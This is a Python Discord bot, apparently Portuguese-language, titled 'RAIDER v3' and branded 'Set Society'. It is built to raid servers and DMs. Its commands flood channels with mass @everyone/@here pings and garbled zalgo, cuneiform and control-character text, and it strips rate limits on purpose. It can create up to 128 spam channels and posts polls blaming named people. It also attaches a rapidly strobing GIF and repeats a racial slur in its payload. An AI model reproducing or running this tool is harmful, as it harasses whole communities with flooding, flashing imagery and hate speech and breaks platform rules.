#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAIDER v3 — SEM COOLDOWN, USER-INSTALL EDITION
- 6 comandos: /blame, /raid, /spam (customizavel), /ping, /whitelist, /blacklist
- Funciona em servers, DM direta e GROUP DMs (user install: allowed_installs)
- @everyone/@here REAL (allowed_mentions global + send explícito)
- Payload ~2000 chars com URLs dos GIFs custom (renderizam preview no client)
- Polls nativas (discord.Poll)
- Whitelist/blacklist em JSON (wl.json / bl.json)
- Spam SEM cooldown artificial: sleep minimo 0.008s, 429 respeita retry_after da lib
"""

import asyncio
import datetime
import io
import json
import math
import os
import random
import struct
import sys
import time
import zlib

import discord
from discord.ext import commands
from discord import app_commands

# ============================ CONFIG ============================
PREFIX = "!"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WHITELIST_FILE = os.path.join(BASE_DIR, "wl.json")
BLACKLIST_FILE = os.path.join(BASE_DIR, "bl.json")


def _load_token() -> str:
    env = os.getenv("DISCORD_TOKEN", "").strip()
    if env:
        return env
    try:
        with open(os.path.join(BASE_DIR, "token.txt"), "r", encoding="utf-8") as f:
            return f.read().strip()
    except OSError:
        return ""


TOKEN = _load_token()
MAX_MSG = 2000

# ============================ BOT ============================
intents = discord.Intents.all()
intents.message_content = True
intents.presences = False

# allowed_mentions GLOBAL: sem isso o Discord corta @everyone/@here por padrão
bot = commands.Bot(
    command_prefix=PREFIX, intents=intents, help_command=None,
    allowed_mentions=discord.AllowedMentions(
        everyone=True, users=True, roles=True),
)

# USER-INSTALL: habilita comandos em DMs e group DMs
install_any = app_commands.allowed_installs(guilds=True, users=True)
ctx_any = app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)

# ============================ WL/BL ============================
def _load_list(path: str) -> list:
    try:
        with open(path, "r", encoding="utf-8") as f:
            d = json.load(f)
            return d if isinstance(d, list) else []
    except Exception:
        return []


def _save_list(path: str, lst: list) -> None:
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(lst, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


OWNER_ID = 1533178254318637186


def _owner_ok(uid: int) -> bool:
    return uid == OWNER_ID or uid in _load_list(WHITELIST_FILE)


def _blocked(uid: int) -> bool:
    return uid in _load_list(BLACKLIST_FILE)


# ============================ PAYLOAD ============================
ZALGO_TOP = "".join(chr(c) for c in range(0x0300, 0x036F))
ZALGO_BOT = ("\u0316\u0317\u0318\u0319\u031A\u031B\u031C\u031D\u031E\u031F"
             "\u0320\u0321\u0322\u0323\u0324\u0325\u0326\u0327\u0328\u0329"
             "\u032A\u032B\u032C\u032D\u032E\u032F\u0330\u0331\u0332\u0333\u0334\u0335")
ZALGO_MID = "\u0335\u0336\u0337\u0338"
WEIRD = [
    "\U0001242B", "\u202E", "\u200B", "\u200D", "\uFE0F", "\uFE0E",
    "\u180E", "\u3164", "\uFFA0", "\u061C", "\u2066\u2069", "\uFFFD",
    "\u0000\uFFF9\uFFFA\uFFFB", "\uE0000\uE007F", "\u10FFFF",
    "\uD7FF\uE000", "\u1F600", "\u2591\u2592\u2593\u2588",
    "\u2620\u2623\u2639\u2764", "\u26A0\u26A1\u2694\u269B",
]

# GIFs custom (acessos diretos — renderizam preview quando o bot envia a URL)
GIF_CUSTOM_URLS = [
    "https://cdn.discordapp.com/attachments/1533509443096940724/1533509532427358339/"
    "3dd02fa49042724212d60154cf81e1af5858f0f24caa7969a1ceba6174e8994b.1.gif",
    "https://cdn.discordapp.com/attachments/751825126189957160/751828025728958464/1.gif",
]
SOCIETY_LINE = "set society was here nigger"


def zalgo_text(n: int = 8) -> str:
    base = random.choice(["A", "S", "E", "T", "N", "H", "O", "X", "M"])
    out = base
    for _ in range(n):
        out += random.choice(ZALGO_TOP) + random.choice(ZALGO_BOT)
        if random.random() < 0.4:
            out += random.choice(ZALGO_MID)
    return out


def cunei_text(n_blocos: int = 12, min_rep: int = 8, max_rep: int = 22) -> str:
    return " ".join("\U0001242B" * random.randint(min_rep, max_rep)
                    for _ in range(n_blocos))


def build_nuke_payload() -> str:
    """~2000 chars: cuneiforme + zalgo + @everyone/@here + Set Society + URL do GIF."""
    parts = []
    cur = 0
    target = MAX_MSG - 300  # reserva pra URL do GIF
    while cur < target:
        r = random.random()
        if r < 0.28:
            seg = random.choice([
                "@everyone @everyone", "@here @here", "@everyone @here",
                "@here @everyone", "@everyone", "@here",
                "@everyone @everyone @here", "@here @everyone @everyone"])
        elif r < 0.58:
            seg = cunei_text(random.randint(5, 12))
        elif r < 0.74:
            seg = "\u202E" + zalgo_text(random.randint(5, 12)) + "\u202C"
        elif r < 0.93:
            seg = f"**{SOCIETY_LINE}** {cunei_text(3)}"
        else:
            seg = "".join(random.choice(WEIRD) * random.randint(1, 4)
                          for _ in range(random.randint(3, 8)))
        if cur + len(seg) > target:
            seg = seg[: target - cur]
        parts.append(seg)
        cur += len(seg)
    body = "".join(parts)
    if SOCIETY_LINE not in body:
        body = body[: MAX_MSG - 620] + f" **{SOCIETY_LINE}** " + cunei_text(10)
    if random.random() < 0.8:
        body = body[: MAX_MSG - 260] + "\n" + random.choice(GIF_CUSTOM_URLS)
    return body[:MAX_MSG]


# ============================ MÍDIA ============================
def make_strobe_gif(w: int = 320, h: int = 320, frames: int = 12) -> bytes:
    """GIF piscando preto/branco com texto invertendo cor (anexo de apoio)."""
    try:
        from PIL import Image, ImageDraw, ImageFont
    except Exception:
        rows = []
        for y in range(h):
            row = bytearray([0])
            for x in range(w):
                band = (x // 32) % 2
                row += b"\x00\x00\x00" if (y // 32) % 2 == band else b"\xff\xff\xff"
            rows.append(bytes(row))
        raw = b"".join(rows)
        idat = zlib.compress(raw, 9)

        def chunk(tag, data):
            return struct.pack(">I", len(data)) + tag + data + \
                   struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
        ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
        return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) +
                chunk(b"IDAT", idat) + chunk(b"IEND", b""))
    imgs = []
    for i in range(frames):
        img = Image.new("RGB", (w, h), (0, 0, 0) if i % 2 == 0 else (255, 255, 255))
        d = ImageDraw.Draw(img)
        for bx in range(0, w, 64):
            d.rectangle([bx, 0, bx + 32, h],
                        fill=(255, 255, 255) if i % 2 == 0 else (0, 0, 0))
        try:
            fnt = ImageFont.truetype(
                "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 38)
        except Exception:
            fnt = ImageFont.load_default()
        d.text((w // 2 - 150, h // 2 - 25), "SET SOCIETY",
               fill=(0, 0, 0) if i % 2 == 0 else (255, 255, 255), font=fnt)
        imgs.append(img)
    buf = io.BytesIO()
    imgs[0].save(buf, format="GIF", save_all=True, append_images=imgs[1:],
                 duration=35, loop=0, optimize=False)
    return buf.getvalue()


STROBE_GIF = make_strobe_gif()


def _gif_file() -> discord.File:
    return discord.File(io.BytesIO(STROBE_GIF), filename="set-society.gif")


# ============================ POLL ============================
def _build_poll(question: str, options: list) -> discord.Poll:
    p = discord.Poll(question=question[:300],
                     duration=datetime.timedelta(days=7), multiple=True)
    for o in options:
        p.add_answer(discord.PollAnswer(text=str(o)[:55]))
    return p


# ============================ EVENTOS ============================
@bot.event
async def on_ready():
    print(f"[+] Logado como {bot.user} (ID: {bot.user.id})", flush=True)
    print(f"[+] Prefixo: {PREFIX} | Slash: / | Guilds: {len(bot.guilds)}", flush=True)
    print(f"[+] WL: {_load_list(WHITELIST_FILE)} | BL: {_load_list(BLACKLIST_FILE)}", flush=True)
    try:
        synced = await bot.tree.sync()
        print(f"[+] Slash sincronizados: {len(synced)}", flush=True)
    except Exception as e:
        print(f"[!] Sync falhou: {e}", flush=True)
    for g in bot.guilds:
        try:
            owner = g.owner
            if owner is None:
                owner = await g.fetch_member(g.owner_id)
            await owner.send(cunei_text(3) + "\n**Set Society** — raider v3 no ar.\n"
                             "Uso: `/spam 20`, `/spam 100 texto`, `/raid 10 5`, "
                             "`/blame fulano`, `/ping`, `/whitelist add ID`")
            print(f"[+] DM pro dono de {g.name}", flush=True)
        except Exception:
            pass


@bot.event
async def on_message(msg):
    if msg.author.bot:
        return
    if _blocked(msg.author.id):
        return
    await bot.process_commands(msg)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    try:
        await ctx.send(f"```{error}```", delete_after=3)
    except Exception:
        pass


# ============================ HELPERS ============================
MENTIONS = discord.AllowedMentions(everyone=True, users=True, roles=True)


async def _check_ok(ctx) -> bool:
    """Owner/whitelist + canal válido. Silencioso em DM/group, avisa em guild."""
    if not _owner_ok(ctx.author.id):
        await ctx.send("✖ Sem permissão", delete_after=3)
        return False
    return True


# ============================ COMANDOS ============================
@bot.hybrid_command(name="ping", description="Latência e status")
@install_any
@ctx_any
async def ping(ctx):
    if not await _check_ok(ctx):
        return
    t0 = time.time()
    msg = await ctx.send("pong...")
    lat = round(bot.latency * 1000, 1)
    await msg.edit(content=f"🏓 Pong! `{lat}ms` | API `{round((time.time()-t0)*1000,1)}ms`")


@bot.hybrid_command(name="spam", description="Flood 2000 chars + GIF + @everyone. /spam [vezes] [texto]")
@install_any
@ctx_any
async def spam(ctx, vezes: int = 20, texto: str = ""):
    if not await _check_ok(ctx):
        return
    vezes = max(1, min(vezes, 1000))
    payload = texto.strip() if texto.strip() else build_nuke_payload()
    for i in range(vezes):
        try:
            if i % 3 == 0:
                await ctx.send(payload[:1900], file=_gif_file(),
                               allowed_mentions=MENTIONS)
            else:
                await ctx.send(payload, allowed_mentions=MENTIONS)
        except Exception:
            pass
        await asyncio.sleep(0.008)
    try:
        await ctx.send(f"✔ {vezes} msg", delete_after=5)
    except Exception:
        pass


@bot.hybrid_command(name="raid", description="Cria N canais com spam + GIF + poll. /raid [canais] [msgs]")
@install_any
@ctx_any
async def raid(ctx, canais: int = 10, msgs: int = 5):
    if not await _check_ok(ctx):
        return
    if ctx.guild is None:
        await ctx.send("✖ /raid só em servidor. Em grupo/DM usa /spam", delete_after=5)
        return
    if not ctx.guild.me.guild_permissions.manage_channels:
        await ctx.send("✖ Sem permissão de gerenciar canais", delete_after=3)
        return
    canais = max(1, min(canais, 128))
    msgs = max(1, min(msgs, 10))
    created = []
    for i in range(canais):
        try:
            ch = await ctx.guild.create_text_channel(
                random.choice(["𒐫𒐫𒐫", "𒐫-nuked", "set-society",
                               "𒐫-jax", "𒐫-gg"]) + f"-{i}")
            created.append(ch)
        except Exception:
            pass
        await asyncio.sleep(0.03)
    for ch in created:
        try:
            for _ in range(msgs):
                await ch.send(build_nuke_payload(), allowed_mentions=MENTIONS)
                await asyncio.sleep(0.008)
        except Exception:
            pass
        try:
            await ch.send("QUEM VAI CAIR?", poll=_build_poll(
                "Set Society raid — quem é o próximo?",
                ["o adm", "todos", "ninguém", SOCIETY_LINE]))
        except Exception:
            pass
    try:
        await ctx.send(f"✔ Raid: {len(created)} canais × {msgs} msg + polls", delete_after=5)
    except Exception:
        pass


@bot.hybrid_command(name="blame", description="Poll culpando alguém + spam. /blame [alvo]")
@install_any
@ctx_any
async def blame(ctx, alvo: str = "o adm"):
    if not await _check_ok(ctx):
        return
    try:
        await ctx.send(
            f"**{alvo}** foi quem destruiu o server 👀 ",
            poll=_build_poll(f"QUEM É O CULPADO? ({alvo})",
                             ["Set Society", SOCIETY_LINE, "o adm", "ninguém"]),
            allowed_mentions=MENTIONS)
        await ctx.send(build_nuke_payload(), allowed_mentions=MENTIONS)
    except Exception as e:
        await ctx.send(f"✖ {e}", delete_after=5)


@bot.hybrid_command(name="whitelist", description="WL add/remove/list <id>")
@install_any
@ctx_any
async def whitelist(ctx, acao: str = "list", user_id: int = 0):
    if not _owner_ok(ctx.author.id):
        await ctx.send("✖ Sem permissão", delete_after=3)
        return
    lst = _load_list(WHITELIST_FILE)
    acao = acao.lower()
    if acao == "add" and user_id:
        if user_id not in lst:
            lst.append(user_id)
            _save_list(WHITELIST_FILE, lst)
        await ctx.send(f"✔ {user_id} {'adicionado' if user_id in lst else 'já na'} WL")
    elif acao == "remove" and user_id:
        if user_id in lst:
            lst.remove(user_id)
            _save_list(WHITELIST_FILE, lst)
        await ctx.send(f"✔ {user_id} {'removido' if user_id not in lst else 'não estava'} WL")
    else:
        await ctx.send(f"WL: {lst or 'vazia'} | /whitelist add|remove <id>")


@bot.hybrid_command(name="blacklist", description="BL add/remove/list <id>")
@install_any
@ctx_any
async def blacklist(ctx, acao: str = "list", user_id: int = 0):
    if not _owner_ok(ctx.author.id):
        await ctx.send("✖ Sem permissão", delete_after=3)
        return
    lst = _load_list(BLACKLIST_FILE)
    acao = acao.lower()
    if acao == "add" and user_id:
        if user_id not in lst:
            lst.append(user_id)
            _save_list(BLACKLIST_FILE, lst)
        await ctx.send(f"✔ {user_id} {'adicionado' if user_id in lst else 'já na'} BL")
    elif acao == "remove" and user_id:
        if user_id in lst:
            lst.remove(user_id)
            _save_list(BLACKLIST_FILE, lst)
        await ctx.send(f"✔ {user_id} {'removido' if user_id not in lst else 'não estava'} BL")
    else:
        await ctx.send(f"BL: {lst or 'vazia'} | /blacklist add|remove <id>")


# ============================ MAIN ============================
if __name__ == "__main__":
    bot.run(TOKEN)